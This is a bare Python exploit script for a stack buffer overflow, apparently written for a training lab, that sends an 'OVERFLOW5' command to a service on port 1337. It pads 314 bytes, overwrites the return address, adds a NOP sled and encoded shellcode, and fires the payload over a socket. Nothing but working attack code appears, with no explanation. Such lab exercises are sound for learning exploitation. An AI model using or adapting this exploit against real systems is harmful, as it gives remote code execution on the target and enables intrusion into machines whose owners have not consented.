#!/usr/bin/python3
import socket
ip = "10.10.146.149"

port = 1337
timeout = 5
prefix = b"OVERFLOW5 "
#buffer = b"A" * 1790 + b"B" * 10




buf =  b""
buf += b"\xfc\xbb\xb7\x79\xe5\x86\xeb\x0c\x5e\x56\x31\x1e\xad"
buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x4b"
buf += b"\x91\x67\x86\xb3\x62\x08\x0e\x56\x53\x08\x74\x13\xc4"
buf += b"\xb8\xfe\x71\xe9\x33\x52\x61\x7a\x31\x7b\x86\xcb\xfc"
buf += b"\x5d\xa9\xcc\xad\x9e\xa8\x4e\xac\xf2\x0a\x6e\x7f\x07"
buf += b"\x4b\xb7\x62\xea\x19\x60\xe8\x59\x8d\x05\xa4\x61\x26"
buf += b"\x55\x28\xe2\xdb\x2e\x4b\xc3\x4a\x24\x12\xc3\x6d\xe9"
buf += b"\x2e\x4a\x75\xee\x0b\x04\x0e\xc4\xe0\x97\xc6\x14\x08"
buf += b"\x3b\x27\x99\xfb\x45\x60\x1e\xe4\x33\x98\x5c\x99\x43"
buf += b"\x5f\x1e\x45\xc1\x7b\xb8\x0e\x71\xa7\x38\xc2\xe4\x2c"
buf += b"\x36\xaf\x63\x6a\x5b\x2e\xa7\x01\x67\xbb\x46\xc5\xe1"
buf += b"\xff\x6c\xc1\xaa\xa4\x0d\x50\x17\x0a\x31\x82\xf8\xf3"
buf += b"\x97\xc9\x15\xe7\xa5\x90\x71\xc4\x87\x2a\x82\x42\x9f"
buf += b"\x59\xb0\xcd\x0b\xf5\xf8\x86\x95\x02\xfe\xbc\x62\x9c"
buf += b"\x01\x3f\x93\xb5\xc5\x6b\xc3\xad\xec\x13\x88\x2d\x10"
buf += b"\xc6\x1f\x7d\xbe\xb9\xdf\x2d\x7e\x6a\x88\x27\x71\x55"
buf += b"\xa8\x48\x5b\xfe\x43\xb3\x0c\x0b\x9f\x8a\x3d\x63\x9d"
buf += b"\xec\xac\x28\x28\x0a\xa4\xc0\x7c\x85\x51\x78\x25\x5d"
buf += b"\xc3\x85\xf3\x18\xc3\x0e\xf0\xdd\x8a\xe6\x7d\xcd\x7b"
buf += b"\x07\xc8\xaf\x2a\x18\xe6\xc7\xb1\x8b\x6d\x17\xbf\xb7"
buf += b"\x39\x40\xe8\x06\x30\x04\x04\x30\xea\x3a\xd5\xa4\xd5"
buf += b"\xfe\x02\x15\xdb\xff\xc7\x21\xff\xef\x11\xa9\xbb\x5b"
buf += b"\xce\xfc\x15\x35\xa8\x56\xd4\xef\x62\x04\xbe\x67\xf2"
buf += b"\x66\x01\xf1\xfb\xa2\xf7\x1d\x4d\x1b\x4e\x22\x62\xcb"
buf += b"\x46\x5b\x9e\x6b\xa8\xb6\x1a\x8b\x4b\x12\x57\x24\xd2"
buf += b"\xf7\xda\x29\xe5\x22\x18\x54\x66\xc6\xe1\xa3\x76\xa3"
buf += b"\xe4\xe8\x30\x58\x95\x61\xd5\x5e\x0a\x81\xfc\x5e\xac"
buf += b"\x7d\xff"

returnAdd = b"\xd3\x11\x50\x62"

NOP = b"\x90" * 20

#buffer = b"A" * 314 + returnAdd + b"C" * (1800 - 314 - 4)
buffer = b"A" * 314 + returnAdd + NOP + buf 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
resp = s.recv(1024)
print(resp)


s.send(prefix + buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()	


